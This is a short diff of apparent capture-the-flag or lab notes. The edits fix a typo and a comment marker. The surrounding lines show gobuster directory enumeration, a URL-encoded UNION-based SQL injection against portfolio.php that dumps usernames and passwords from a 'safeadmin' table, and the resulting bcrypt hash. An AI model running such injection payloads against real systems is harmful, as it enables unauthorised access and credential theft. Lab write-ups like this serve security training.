@@ -1,4 +1,4 @@
-# Enmeration and reconnaissance:
+# Enumeration and reconnaissance:
 gobuster dir -u http://<IP>:<PORT>/ -w <wordlist> -t 10 -e php
 gobuster dir -u http://<IP>:<PORT>/administrat -w <wordlist> -t 10 -e php
 
@@ -22,7 +22,7 @@ gobuster dir -u http://<IP>:<PORT>/administrat -w <wordlist> -t 10 -e php
 	# Exfiltrate hash and user from the target column within the target DB's target table 
 	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%20NULL,GROUP_CONCAT(username,%20%27%20%27,%20password),NULL%20FROM%20freelancer.safeadmin%20--%20-
 
-	result:
+	# result:
 	safeadm $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K -
 
 # Correct path:
